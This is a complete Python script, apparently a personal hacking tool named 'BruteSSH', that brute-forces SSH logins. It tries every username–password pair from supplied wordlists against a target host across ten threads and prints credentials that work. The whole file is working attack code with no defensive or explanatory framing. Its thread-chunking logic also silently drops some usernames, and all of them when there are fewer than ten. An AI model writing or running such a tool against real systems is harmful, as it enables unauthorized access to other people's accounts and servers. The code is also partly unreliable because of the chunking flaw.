#!/usr/bin/python3 

## Author -- k0imet
import argparse
import paramiko
import threading
import pyfiglet
from colorama import init, Fore, Style

def ssh_login(hostname, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname, port=port, username=username, password=password)
        print(f"{Fore.GREEN}Successful login - Username: {username}, Password: {password}{Style.RESET_ALL}")
        client.close()
    except paramiko.AuthenticationException:
        print(f"Failed login - Username: {username}, Password: {password}")
        client.close()
    except paramiko.SSHException as e:
        if "Error reading SSH protocol banner" in str(e):
            print(f"Error: {e} - Unable to read SSH protocol banner")
        else:
            print(f"Error: {e}")
        client.close()

def ssh_wordlist_attack(hostname, port, username_list, password_list):
    for username in username_list:
        for password in password_list:
            ssh_login(hostname, port, username, password)

def parse_arguments():
    parser = argparse.ArgumentParser(description="SSH wordlist attack tool")
    parser.add_argument("-t", "--target-host", required=True, help="Target host")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("-U", "--username-list", required=True, help="Path to username list file")
    parser.add_argument("-P", "--password-list", required=True, help="Path to password list file")
    return parser.parse_args()

def read_wordlist(file_path):
    with open(file_path, "r") as file:
        return file.read().splitlines()

def print_banner():
    banner = pyfiglet.figlet_format("BruteSSH")
    print(f"{Fore.YELLOW}{banner}{Style.RESET_ALL}")

if __name__ == "__main__":
    init(autoreset=True)  # Initialize colorama

    print_banner()

    args = parse_arguments()

    host = args.target_host
    port = args.port
    username_list = read_wordlist(args.username_list)
    password_list = read_wordlist(args.password_list)

    num_threads = 10
    chunk_size = len(username_list) // num_threads

    threads = []
    for i in range(num_threads):
        start = i * chunk_size
        end = start + chunk_size
        thread = threading.Thread(target=ssh_wordlist_attack, args=(host, port, username_list[start:end], password_list))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
